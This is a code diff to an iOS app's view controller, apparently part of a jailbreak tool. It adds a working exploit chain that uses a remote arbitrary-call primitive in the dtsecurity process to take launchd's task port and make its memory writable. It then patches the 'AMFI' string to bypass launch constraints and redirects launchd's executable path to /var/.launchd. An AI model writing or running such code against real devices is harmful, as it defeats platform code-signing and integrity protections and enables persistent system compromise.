@@ -1,4 +1,5 @@
 #include "common.h"
+#include "taskporthaxx.h"
 #include "credits.h"
 #include "bootstrap.h"
 #include "AppInfo.h"
@@ -17,8 +18,37 @@ typedef enum { kSecCSDefaultFlags=0, kSecCSSigningInformation = 1 << 1 } SecCSFl
 OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef* CF_RETURNS_RETAINED staticCode);
 OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef* __nonnull CF_RETURNS_RETAINED information);
 
+@import MachO;
+@import Darwin;
+NSDictionary *getLaunchdStringOffsets(void) {
+    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
+    
+    char *path = "/sbin/launchd";
+    int fd = open(path, O_RDONLY);
+    struct stat s;
+    fstat(fd, &s);
+    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
+    assert(map != MAP_FAILED);
+    
+    size_t size = 0;
+    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
+    assert(cstring);
+    while (size > 0) {
+        dict[@(cstring)] = @(cstring - (char *)map);
+        uint64_t off = strlen(cstring) + 1;
+        cstring += off;
+        size -= off;
+    }
+    
+    munmap((void *)map, s.st_size);
+    close(fd);
+    return dict;
+}
+
 
 @interface ViewController ()
+@property(nonatomic) mach_port_t exceptionPort;
+@property(nonatomic) mach_port_t fakeBootstrapPort;
 @end
 
 BOOL gTweakEnabled=YES;
@@ -45,8 +75,188 @@ BOOL gTweakEnabled=YES;
     ]];
     
     [vc didMoveToParentViewController:self];
-}
+    // find launchd string offsets
+    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
+    if (!defaults.offsetLaunchdPath) {
+        NSDictionary *offsets = getLaunchdStringOffsets();
+        defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
+        // AMFI is only needed for iOS 17.0 to bypass launch constraint
+        defaults.offsetAMFI = [offsets[@"AMFI"] unsignedLongValue];
+        NSLog(@"Found launchd path string offset: 0x%lx\n", defaults.offsetLaunchdPath);
+        if (defaults.offsetAMFI) {
+            NSLog(@"Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
+        }
+    }
+    
+    self.exceptionPort = setup_exception_server();
+    self.fakeBootstrapPort = setup_fake_bootstrap_server();
 
+}
+void testButtonTapped() {
+  launchTest(@"dtsecurity");
+  NSLog(@"launch dtsecurity");
+}
+void arbCallButtonTapped() {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+
+        kern_return_t kr;
+        
+        // Create a region which holds temp data (should we use stack instead?)
+        vm_size_t page_size = getpagesize();
+        vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        if (!map) {
+            NSLog(@"Failed to call mmap. Please try resetting pointer and try again\n");
+            return;
+        }
+        NSLog(@"Mapped memory at 0x%lx\n", map);
+        
+        // Test mkdir
+//        RemoteWriteString(map, "/tmp/.it_works");
+//        RemoteArbCall(mkdir, map, 0700);
+        
+        // Get my task port
+        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
+//        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
+//        if (kr != KERN_SUCCESS) {
+//            NSLog(@"Failed to get my task port\n");
+//            return;
+//        }
+//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
+        // Map the page we allocated in dtsecurity to this process
+//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
+//        if (kr != KERN_SUCCESS) {
+//            NSLog(@"Failed to create dtsecurity<->haxx shared mapping\n");
+//            return;
+//        }
+//        vm_address_t local_map = RemoteRead64(map);
+//        NSLog(@"Created shared mapping: 0x%lx\n", local_map);
+//        NSLog(@"read: 0x%llx\n", *(uint64_t *)local_map);
+        
+        // Get dtsecurity dyld base for blr x19
+        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
+         kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"task_info failed\n");
+            return;
+        }
+        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
+        vm_address_t remote_dyld_base;
+        do {
+            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
+            // FIXME: why do I have to sleep a bit for dyld base to be available?
+            usleep(100000);
+        } while (remote_dyld_base == 0);
+        NSLog(@"dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
+        
+        // Get launchd task port
+        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"Failed to get launchd task port\n");
+            return;
+        }
+        
+        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
+        NSLog(@"Got launchd task port: %d\n", launchd_task);
+        
+        // Get remote dyld base
+        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
+        kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"task_info failed\n");
+            return;
+        }
+        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
+        NSLog(@"launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
+        
+        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
+        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
+            return;
+        }
+        uint32_t infoArrayCount = RemoteRead32(map);
+        NSLog(@"launchd infoArrayCount: %u\n", infoArrayCount);
+        
+        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
+        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
+            return;
+        }
+        
+        // Enumerate images to find launchd base
+        vm_address_t launchd_base = 0;
+        vm_address_t infoArray = RemoteRead64(map);
+        for (int i = 0; i < infoArrayCount; i++) {
+            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
+            uint64_t base = RemoteRead64(map);
+            if (base % page_size) {
+                // skip unaligned entries, as they are likely in dsc
+                continue;
+            }
+            NSLog(@"Image[%d] = 0x%llx\n", i, base);
+            // read magic, cputype, cpusubtype, filetype
+            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
+            uint64_t magic = RemoteRead32(map);
+            if (magic != MH_MAGIC_64) {
+                NSLog(@"not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
+                continue;
+            }
+            uint32_t filetype = RemoteRead32(map + 12);
+            if (filetype == MH_EXECUTE) {
+                NSLog(@"found launchd executable at 0x%llx\n", base);
+                launchd_base = base;
+                break;
+            }
+        }
+        
+        // Reprotect rw
+        // minimum page = 0x5f000;
+        vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
+        vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
+        
+        NSLog(@"reprotecting 0x%lx\n", launchd_base + 0x5f000);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + 0x5f000), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"vm_protect failed: kr = %s\n", mach_error_string(kr));
+            sleep(5);
+            return;
+        }
+
+        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
+        // Bypass panic by launch constraints
+        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments
+
+        // Patch string `AMFI`
+        
+        const char *newStr = "AAAA\x00";
+        RemoteWriteString(map, newStr);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"vm_write failed\n");
+            sleep(5);
+            return;
+        }
+        RemoteTaskHexDump(launchd_base + amfi_str_off, 0x100, launchd_task, (uint64_t)map);
+
+        // Overwrite /sbin/launchd string to /var/.launchd
+        const char *newPath = getLaunchdPath().UTF8String;
+        RemoteWriteString(map, newPath);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
+        if (kr != KERN_SUCCESS) {
+            NSLog(@"vm_write failed\n");
+            sleep(5);
+            return;
+        }
+        NSLog(@"Successfully overwrote launchd executable path string to %s\n", newPath);
+
+        RemoteArbCall(exit, 0);
+        
+    });
+}
 BOOL updateOpensshStatus(BOOL notify)
 {
     BOOL status;
